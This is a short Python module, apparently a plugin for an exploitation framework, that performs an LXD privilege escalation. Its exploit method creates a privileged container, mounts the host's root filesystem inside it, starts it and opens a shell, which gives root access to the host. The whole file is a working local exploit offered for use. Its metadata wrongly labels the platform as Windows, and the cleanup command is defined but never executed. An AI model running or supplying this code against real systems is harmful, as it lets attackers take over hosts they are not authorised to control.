import Util
import os
import sys

class Exploit(object):
   def __init__(self):
      self.Name = "Lxd"
      self.Description = "Lxd Privilege Escalation"
      self.Author = "Freddy Gomes"
      self.Version = "0.1"
      self.POC = None
      self.Platform = Util.Platform.Windows
      self.Type = Util.Type.Local
      self.HOST = None
      self.PORT = None

   def exploit(self):
      command1 = "lxc init alpine privesc -c security.privileged=true"
      command2 = "lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true"
      command3 = "lxc start privesc"
      command4 = "lxc exec privesc /bin/sh"
      command5 = "lxc stop privesc && lxc delete privesc"
   
      os.system(command1)
      os.system(command2)
      os.system(command3)
      os.system(command4)
      

   def run(self):
      self.exploit()
